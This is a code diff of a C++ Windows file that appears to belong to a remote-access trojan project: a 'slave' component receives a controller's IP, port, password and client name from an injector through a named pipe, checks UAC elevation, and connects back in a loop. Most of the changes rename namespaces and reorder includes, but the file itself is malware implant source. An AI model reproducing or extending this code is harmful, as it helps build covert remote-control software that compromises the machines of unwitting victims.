@@ -1,32 +1,33 @@
 #include <windows.h>
 HANDLE threadHandle;
 
-#include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <Innocence.hpp>
+using namespace Innocence;
 
 #include <common/Log.hpp>
 
-#include <network/Pipe.hpp>
+
 #include <system/Uac.hpp>
 #include <system/Process.hpp>
+using namespace System;
 
 #include "SlaveCore.hpp"
-using namespace Inhibition;
-using namespace System;
+
+#include <network/Pipe.hpp>
 
 // il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
 // nous envoyer l'injecteur
 // pour ce faire, on utilise les "pipe" à la windows (IPC)
-Blaspheme::ConnectionInfo getConnectionInfo()
+ConnectionInfo getConnectionInfo()
 {
-	Blaspheme::ConnectionInfo info;
+	ConnectionInfo info;
 	try
 	{
 		Network::Pipe pipe;
 		pipe.connect(Innocence::PIPE_NAME);
-		char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
-		pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
-		std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+		char blaspheme [CONNECTION_INFO_SIZE];
+		pipe.recv(blaspheme, CONNECTION_INFO_SIZE);
+		std::string buffer(blaspheme, CONNECTION_INFO_SIZE);
 		size_t end = buffer.find_last_of(MARKER);
 		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);
 
@@ -62,9 +63,9 @@ DWORD WINAPI run(void)
 		LOG.setHeader("SLAVE");
 		LOG.addObserver(new Common::LogToConsole);
 		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
-		Blaspheme::ConnectionInfo info = getConnectionInfo();	    
+		ConnectionInfo info = getConnectionInfo();	    
 		
-		SlaveCore slave(info);
+		Inhibition::SlaveCore slave(info);
 		LOG << GetElevationType();
 		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
 		while(!slave.exiting())
